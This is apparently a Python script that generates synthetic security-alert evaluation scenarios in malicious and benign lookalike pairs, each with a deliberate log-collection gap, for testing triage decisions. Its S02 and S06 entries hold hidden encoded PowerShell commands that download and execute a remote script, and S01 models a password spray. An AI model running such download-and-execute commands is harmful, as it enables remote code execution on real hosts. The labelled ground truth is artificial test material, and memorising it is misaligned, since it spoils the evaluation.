"""Author the 8 evaluation scenarios (S01, S08, S02, S07, S04, S10, S06, S12) as EvidenceForge YAML
plus Evidence Vacuum meta files. Deterministic; re-run after any edit.

    tools/cuga-agent/.venv/Scripts/python.exe 03_scenarios/make_scenarios.py

Design rules (DECISIONS_LOG, pilot lessons):
  * One shared environment (Lakeview v2) and one shared org-context file for every scenario.
  * 4 malicious/benign lookalike pairs. Both members of a pair share the alert style, the case-slice
    focus rule and the SAME gap, so only the ground truth differs.
  * Consequential gaps (pairs auth, powershell, beacon) must hide every suspicious element, leaving a
    routine-looking remainder. The account pair gets a non-consequential gap (proxy outage).
  * The benign members have a clean evidence chain that matches the org context.
"""
import base64
import json
from copy import deepcopy
from pathlib import Path

import yaml

HERE = Path(__file__).resolve().parent
CFG = HERE / "configs"
CONTEXT = "env_lakeview_v2.context.txt"
DAY = "2026-11-10"
SLICE = [f"{DAY}T13:20:00.000Z", f"{DAY}T14:20:00.000Z"]
GAPWIN = [f"{DAY}T13:30:00.000Z", f"{DAY}T14:10:00.000Z"]
SOURCES = ["winsec", "sysmon", "proxy", "zeek_conn", "zeek_dns", "zeek_ssl"]

IP = {"WS-DWELLS-01": "10.20.10.21", "WS-RIYER-01": "10.20.10.22", "WS-KORTEGA-01": "10.20.10.23",
      "WS-TNGUYEN-01": "10.20.10.24", "DC-LV-01": "10.20.20.10", "FILE-LV-01": "10.20.20.20",
      "PROXY-LV-01": "10.20.20.30"}

# --------------------------------------------------------------------------- environment
def ws(host, user):
    return {"hostname": host, "ip": IP[host], "os": "Windows 11 Enterprise", "type": "workstation",
            "assigned_user": user, "services": ["dns-client", "termservice"]}


ENV = {
    "description": "Small accounting office with AD, a file server and an explicit forward proxy",
    "domain": "lakeview-acct.local",
    "timezone": {"default": "UTC"},
    "proxy": {"mode": "explicit", "listener_port": 8080},
    "users": [
        {"username": "dana.wells", "full_name": "Dana Wells", "email": "dana.wells@lakeviewacct.com",
         "persona": "accountant", "primary_system": "WS-DWELLS-01", "groups": ["finance"], "enabled": True,
         "browsing_intensity": "normal"},
        {"username": "raj.iyer", "full_name": "Raj Iyer", "email": "raj.iyer@lakeviewacct.com",
         "persona": "analyst", "primary_system": "WS-RIYER-01", "groups": ["finance"], "enabled": True,
         "browsing_intensity": "light"},
        {"username": "kim.ortega", "full_name": "Kim Ortega", "email": "kim.ortega@lakeviewacct.com",
         "persona": "sysadmin", "primary_system": "WS-KORTEGA-01", "groups": ["it-admins", "domain-admins"],
         "enabled": True, "browsing_intensity": "light"},
        {"username": "tara.nguyen", "full_name": "Tara Nguyen", "email": "tara.nguyen@lakeviewacct.com",
         "persona": "help_desk", "primary_system": "WS-TNGUYEN-01", "groups": ["helpdesk"], "enabled": True,
         "browsing_intensity": "light"},
    ],
    "service_accounts": ["svc-backup", "svc-reporting"],
    "systems": [
        ws("WS-DWELLS-01", "dana.wells"), ws("WS-RIYER-01", "raj.iyer"),
        ws("WS-KORTEGA-01", "kim.ortega"), ws("WS-TNGUYEN-01", "tara.nguyen"),
        {"hostname": "DC-LV-01", "ip": IP["DC-LV-01"], "os": "Windows Server 2022", "type": "domain_controller",
         "services": ["kerberos", "ldap", "dns"], "roles": ["domain_controller", "dns_server"]},
        {"hostname": "FILE-LV-01", "ip": IP["FILE-LV-01"], "os": "Windows Server 2022", "type": "server",
         "services": ["smb", "dns-client"], "roles": ["file_server"]},
        {"hostname": "PROXY-LV-01", "ip": IP["PROXY-LV-01"], "os": "Ubuntu 22.04 LTS", "type": "server",
         "services": ["squid", "dns-client"], "roles": ["forward_proxy"]},
    ],
    "network": {
        "public_cidrs": ["198.51.100.0/28"],
        "segments": [
            {"name": "workstations", "cidr": "10.20.10.0/24", "exposure": "internal",
             "systems": ["WS-DWELLS-01", "WS-RIYER-01", "WS-KORTEGA-01", "WS-TNGUYEN-01"]},
            {"name": "servers", "cidr": "10.20.20.0/24", "exposure": "internal",
             "systems": ["DC-LV-01", "FILE-LV-01", "PROXY-LV-01"]},
        ],
        "sensors": [{"type": "network", "name": "lv-core-span", "hostname": "ZEEK-LV-CORE",
                     "monitoring_segments": ["workstations", "servers"], "direction": "bidirectional",
                     "placement": "span", "log_formats": ["zeek"]}],
    },
}


def scenario_yaml(sid, cls, desc, seed, storyline):
    return {
        "version": "1.0",
        "name": f"ev-{sid}",
        "description": f"Evidence Vacuum evaluation scenario {sid} ({cls}). {desc}",
        "environment": deepcopy(ENV),
        "time_window": {"start": f"{DAY}T13:00:00Z", "duration": "2h", "warmup": "1h"},
        "generation_seed": seed,
        "baseline_activity": {"description": "Quiet afternoon: light browsing via the proxy, file-share access, "
                                             "domain authentication", "intensity": "low", "variation": "low",
                              "suspicious_noise": "low"},
        "observation_profile": "complete",
        "storyline": storyline,
        "output": {"logs": [{"format": f} for f in ["windows_event_security", "windows_event_sysmon", "zeek_conn",
                                                    "zeek_dns", "zeek_ssl", "proxy_access"]],
                   "destination": f"out/{sid}", "compression": False},
    }


def entry(eid, time, actor, system, activity, events):
    return {"id": eid, "time": time, "actor": actor, "system": system, "activity": activity, "events": events}


def enc(ps: str) -> str:
    return base64.b64encode(ps.encode("utf-16-le")).decode()


# --------------------------------------------------------------------------- gaps + manifests
GAPS = {
    "auth": {"sources": ["winsec", "sysmon"], "hosts": ["DC-LV-01", "FILE-LV-01"],
             "mechanism": "Windows Event Forwarding collector outage for the server subscription "
                          "(DC-LV-01 and FILE-LV-01 Security and Sysmon channels not ingested)"},
    "powershell": {"sources": ["winsec", "sysmon"], "hosts": ["WS-DWELLS-01"],
                   "mechanism": "Windows Event Forwarding stopped on WS-DWELLS-01 (Security and Sysmon not ingested)"},
    "beacon": {"sources": ["winsec", "sysmon", "proxy"], "hosts": ["WS-RIYER-01", "PROXY-LV-01"],
               "mechanism": "Central log collector outage: WS-RIYER-01 Windows Event Forwarding and the proxy "
                            "access-log forwarder were not ingested"},
    "account": {"sources": ["proxy"], "hosts": ["PROXY-LV-01"],
                "mechanism": "Proxy access-log forwarder outage (proxy requests not ingested)"},
}
SENSOR_SCOPE = {"winsec": "Windows Security log", "sysmon": "Sysmon", "proxy": "proxy access log",
                "zeek_conn": "Zeek conn (core SPAN)", "zeek_dns": "Zeek dns (core SPAN)", "zeek_ssl": "Zeek ssl (core SPAN)"}


def build_gap(kind):
    g = deepcopy(GAPS[kind])
    g["window"] = GAPWIN
    # build_views.py filters on the record's host. Proxy records carry the CLIENT host, so a proxy outage
    # applies to every client: use "*" for proxy-only gaps; mixed gaps are expanded into per-source rules.
    if g["sources"] == ["proxy"]:
        g["hosts"] = ["*"]
    return g


def manifest(kind):
    g = GAPS[kind]
    rows = []
    for s in SOURCES:
        if s in g["sources"]:
            hosts = ["PROXY-LV-01"] if s == "proxy" else [h for h in g["hosts"] if h != "PROXY-LV-01"]
            for h in hosts:
                rows.append({"sensor": s, "host": h, "window": [GAPWIN[0][:19] + "Z", GAPWIN[1][:19] + "Z"],
                             "status": "not_collected", "reason": g["mechanism"]})
            rows.append({"sensor": s, "host": "all other hosts, and the hosts above outside the listed window", "status": "ok"})
        else:
            rows.append({"sensor": s, "host": "all hosts" if not s.startswith("zeek") else "core SPAN (workstations, servers)",
                         "status": "ok"})
    return {"sensors": rows}


# --------------------------------------------------------------------------- scenarios
S = {}

# ---- Pair AUTH: S01 (M) password spray with one success / S08 (B) service account with rotated password
S["S01"] = dict(cls="MALICIOUS", pair="auth", alert_category="auth_failures", gap_type="consequential", seed=2001,
    archetype="password_spray_success",
    desc="External password spray against four domain accounts; raj.iyer's password succeeds after 9 attempts.",
    alert="Authentication monitoring: repeated failed domain logons involving account raj.iyer around 13:40 UTC on "
          "2026-11-10. Review authentication activity between 13:20 and 14:20 UTC and decide whether it is malicious.",
    focus={"hosts": [], "ips": [], "users": ["raj.iyer"]},
    story=[entry("s01-spray", "+40m", "raj.iyer", "DC-LV-01",
                 "External password spray against several accounts; raj.iyer's password is guessed",
                 [{"type": "credential_spray", "technique": "T1110.003 - Brute Force: Password Spraying",
                   "source_ip": "198.51.100.77", "pattern": "spray",
                   "target_accounts": ["dana.wells", "raj.iyer", "kim.ortega", "tara.nguyen"],
                   "logon_type": 3, "interval": "20s", "count": 16,
                   "success": {"account": "raj.iyer", "after": 9}}])])

S["S08"] = dict(cls="BENIGN", pair="auth", alert_category="auth_failures", gap_type="consequential", seed=2008,
    archetype="service_account_rotated_password",
    desc="ReportSync job on FILE-LV-01 keeps using svc-reporting's old password after the scheduled rotation.",
    alert="Authentication monitoring: repeated failed domain logons involving account svc-reporting around 13:40 UTC "
          "on 2026-11-10. Review authentication activity between 13:20 and 14:20 UTC and decide whether it is malicious.",
    focus={"hosts": [], "ips": [], "users": ["svc-reporting"]},
    story=[entry("s08-stale-password", "+31m", "svc-reporting", "FILE-LV-01",
                 "ReportSync retries every minute with the pre-rotation svc-reporting password",
                 [{"type": "credential_spray", "description": "Benign: scheduled job using a stale password after CHG-2291",
                   "source_ip": IP["FILE-LV-01"], "pattern": "brute_force", "target_accounts": ["svc-reporting"],
                   "logon_type": 3, "interval": "60s", "count": 16, "jitter": 0.1}])])

# ---- Pair POWERSHELL: S02 (M) macro -> encoded download cradle / S07 (B) admin patch script
CRADLE = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nb-tools/ps-utils/main/upd.ps1')"
S["S02"] = dict(cls="MALICIOUS", pair="powershell", alert_category="endpoint_powershell", gap_type="consequential",
    seed=2002, archetype="macro_encoded_powershell_cradle",
    desc="Macro document spawns hidden encoded PowerShell that downloads a script from GitHub raw and loads a DLL.",
    alert="Help desk ticket: dana.wells (WS-DWELLS-01) reports that a PowerShell window briefly appeared around 13:40 "
          "UTC on 2026-11-10 and asks whether her PC is OK. Review activity between 13:20 and 14:20 UTC.",
    focus={"hosts": ["WS-DWELLS-01"], "ips": [IP["WS-DWELLS-01"]], "users": ["dana.wells"]},
    story=[entry("s02-logon", "+35m", "dana.wells", "WS-DWELLS-01", "User logs on interactively",
                 [{"type": "logon", "logon_type": 2}]),
           entry("s02-macro", "+40m", "dana.wells", "WS-DWELLS-01",
                 "Invoice attachment macro launches hidden encoded PowerShell download cradle, then loads a DLL",
                 [{"type": "process", "process_ref": "word",
                   "process_name": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                   "command_line": r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\dana.wells\Downloads\Invoice_Nov_2026.docm"'},
                  {"type": "process", "process_ref": "ps", "parent_ref": "word",
                   "technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
                   "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                   "command_line": "powershell.exe -nop -w hidden -enc " + enc(CRADLE)},
                  {"type": "connection", "dst_ip": "185.199.108.133", "dst_port": 443,
                   "hostname": "raw.githubusercontent.com", "service": "ssl", "orig_bytes": 1400, "resp_bytes": 48200},
                  {"type": "process", "parent_ref": "ps", "technique": "T1218.011 - System Binary Proxy Execution: Rundll32",
                   "process_name": r"C:\Windows\System32\rundll32.exe",
                   "command_line": r"rundll32.exe C:\Users\dana.wells\AppData\Roaming\msupd.dll,Start"}])])

S["S07"] = dict(cls="BENIGN", pair="powershell", alert_category="endpoint_powershell", gap_type="consequential",
    seed=2007, archetype="admin_patch_script",
    desc="IT administrator remotely runs the monthly patch script on dana.wells' workstation.",
    alert=S["S02"]["alert"], focus=S["S02"]["focus"],
    story=[entry("s07-admin-logon", "+38m", "kim.ortega", "WS-DWELLS-01",
                 "kim.ortega connects to WS-DWELLS-01 from WS-KORTEGA-01 for patching",
                 [{"type": "logon", "logon_type": 3, "source_ip": IP["WS-KORTEGA-01"]}]),
           entry("s07-patch", "+40m", "kim.ortega", "WS-DWELLS-01",
                 "Monthly patch script runs and downloads updates from Windows Update",
                 [{"type": "process", "process_ref": "ps",
                   "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                   "command_line": r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\FILE-LV-01\IT\scripts\Install-MonthlyPatches.ps1"},
                  {"type": "connection", "dst_ip": "13.107.4.50", "dst_port": 443,
                   "hostname": "download.windowsupdate.com", "service": "ssl", "orig_bytes": 3100, "resp_bytes": 41800000},
                  {"type": "process", "parent_ref": "ps", "process_name": r"C:\Windows\System32\wusa.exe",
                   "command_line": r"wusa.exe C:\Windows\Temp\patches\windows11-kb5046633-x64.msu /quiet /norestart"}])])

# ---- Pair BEACON: S04 (M) typosquat updater C2 / S10 (B) real DataGrid updater
S["S04"] = dict(cls="MALICIOUS", pair="beacon", alert_category="periodic_network", gap_type="consequential",
    seed=2004, archetype="c2_beacon_typosquat",
    desc="Fake DataGrid updater in the user profile beacons every 5 minutes to the typosquat update.datagrid-analytics.co.",
    alert="Network anomaly detection: WS-RIYER-01 made periodic outbound HTTPS connections at roughly 5-minute "
          "intervals between 13:30 and 14:10 UTC on 2026-11-10. Review activity between 13:20 and 14:20 UTC and "
          "decide whether it is malicious.",
    focus={"hosts": ["WS-RIYER-01"], "ips": [IP["WS-RIYER-01"]], "users": ["raj.iyer"]},
    story=[entry("s04-logon", "+25m", "raj.iyer", "WS-RIYER-01", "User logs on interactively",
                 [{"type": "logon", "logon_type": 2}]),
           entry("s04-implant", "+36m", "raj.iyer", "WS-RIYER-01",
                 "Masquerading updater in AppData starts and beacons to a typosquatted domain",
                 [{"type": "process", "technique": "T1036.005 - Masquerading: Match Legitimate Name or Location",
                   "process_name": r"C:\Users\raj.iyer\AppData\Roaming\DataGrid\dgupdate.exe",
                   "command_line": r'"C:\Users\raj.iyer\AppData\Roaming\DataGrid\dgupdate.exe" --background'},
                  {"type": "beacon", "technique": "T1071.001 - Application Layer Protocol: Web Protocols",
                   "dst_ip": "203.0.113.201", "dst_port": 443, "hostname": "update.datagrid-analytics.co",
                   "service": "ssl", "interval": "5m", "duration": "30m", "jitter": 0.1}])])

S["S10"] = dict(cls="BENIGN", pair="beacon", alert_category="periodic_network", gap_type="consequential",
    seed=2010, archetype="legit_update_check",
    desc="The installed DataGrid Analytics updater checks update.datagrid-analytics.com every 5 minutes.",
    alert=S["S04"]["alert"], focus=S["S04"]["focus"],
    story=[entry("s10-logon", "+25m", "raj.iyer", "WS-RIYER-01", "User logs on interactively",
                 [{"type": "logon", "logon_type": 2}]),
           entry("s10-updater", "+36m", "raj.iyer", "WS-RIYER-01",
                 "Approved DataGrid updater polls its vendor update endpoint",
                 [{"type": "process", "process_name": r"C:\Program Files\DataGrid\Analytics\dgupdate.exe",
                   "command_line": r'"C:\Program Files\DataGrid\Analytics\dgupdate.exe" --background'},
                  {"type": "beacon", "description": "Benign periodic update check",
                   "dst_ip": "203.0.113.150", "dst_port": 443, "hostname": "update.datagrid-analytics.com",
                   "service": "ssl", "interval": "5m", "duration": "30m", "jitter": 0.1}])])

# ---- Pair ACCOUNT (non-consequential gap): S06 (M) rogue local admin + persistence / S12 (B) helpdesk temp account
S["S06"] = dict(cls="MALICIOUS", pair="account", alert_category="account_creation", gap_type="non-consequential",
    seed=2006, archetype="rogue_local_admin_persistence",
    desc="RDP from an external address as kim.ortega creates local admin support_tmp and a hidden-PowerShell scheduled task.",
    alert="Account management alert: a new account named support_tmp was created around 13:42 UTC on 2026-11-10. "
          "Review activity between 13:20 and 14:20 UTC and decide whether it is malicious.",
    focus={"hosts": ["WS-RIYER-01"], "ips": [], "users": ["support_tmp"]},
    story=[entry("s06-rdp", "+38m", "kim.ortega", "WS-RIYER-01", "RDP into WS-RIYER-01 from an external address",
                 [{"type": "rdp_session", "source_ip": "198.51.100.77",
                   "technique": "T1021.001 - Remote Services: Remote Desktop Protocol"}]),
           entry("s06-persist", "+42m", "kim.ortega", "WS-RIYER-01",
                 "Creates a local administrator and a scheduled task running hidden encoded PowerShell",
                 [{"type": "account_created", "target_username": "support_tmp",
                   "technique": "T1136.001 - Create Account: Local Account"},
                  {"type": "group_member_added", "group_name": "Administrators", "member_name": "support_tmp",
                   "scope": "local", "technique": "T1098 - Account Manipulation"},
                  {"type": "scheduled_task_created", "task_name": r"\Microsoft\Windows\SyncCheck",
                   "task_content": "powershell.exe -nop -w hidden -enc " + enc("IEX (iwr http://198.51.100.77/s.ps1)"),
                   "technique": "T1053.005 - Scheduled Task/Job: Scheduled Task"}])])

S["S12"] = dict(cls="BENIGN", pair="account", alert_category="account_creation", gap_type="non-consequential",
    seed=2012, archetype="helpdesk_temp_account",
    desc="Help desk creates temporary contractor account temp.jsmith and adds it to the Contractors group.",
    alert="Account management alert: a new account named temp.jsmith was created around 13:42 UTC on 2026-11-10. "
          "Review activity between 13:20 and 14:20 UTC and decide whether it is malicious.",
    focus={"hosts": [], "ips": [], "users": ["temp.jsmith", "tara.nguyen"]},
    story=[entry("s12-logon", "+38m", "tara.nguyen", "DC-LV-01", "Help desk opens an admin console session to the DC",
                 [{"type": "logon", "logon_type": 3, "source_ip": IP["WS-TNGUYEN-01"]}]),
           entry("s12-create", "+42m", "tara.nguyen", "DC-LV-01",
                 "Creates temp.jsmith for a contractor and adds it to Contractors",
                 [{"type": "account_created", "target_username": "temp.jsmith"},
                  {"type": "group_member_added", "group_name": "Contractors", "member_name": "temp.jsmith",
                   "scope": "global"}])])

PAIRGAP = {"auth": "auth", "powershell": "powershell", "beacon": "beacon", "account": "account"}

if __name__ == "__main__":
    decisive = {"auth_failures": ["winsec"], "endpoint_powershell": ["sysmon", "winsec"],
                "periodic_network": ["proxy", "sysmon"], "account_creation": ["winsec"]}
    for sid, s in S.items():
        y = scenario_yaml(sid, s["cls"], s["desc"], s["seed"], s["story"])
        (CFG / f"{sid}.yaml").write_text(yaml.safe_dump(y, sort_keys=False, allow_unicode=True, width=1000),
                                         encoding="utf-8")
        meta = {"scenario_id": sid, "pilot_only": False, "class": s["cls"], "pair": s["pair"],
                "archetype": s["archetype"], "alert_category": s["alert_category"], "gap_type": s["gap_type"],
                "seed": s["seed"], "alert_summary": s["alert"], "window": SLICE, "focus": s["focus"],
                "gap": build_gap(PAIRGAP[s["pair"]]), "coverage_manifest": manifest(PAIRGAP[s["pair"]]),
                "environment_context": CONTEXT}
        (CFG / f"{sid}.meta.json").write_text(json.dumps(meta, indent=1), encoding="utf-8")
        print("wrote", sid, s["cls"], s["pair"], s["gap_type"])
    (HERE / "decisive_sensors.json").write_text(json.dumps(decisive, indent=1), encoding="utf-8")
    print("wrote decisive_sensors.json")
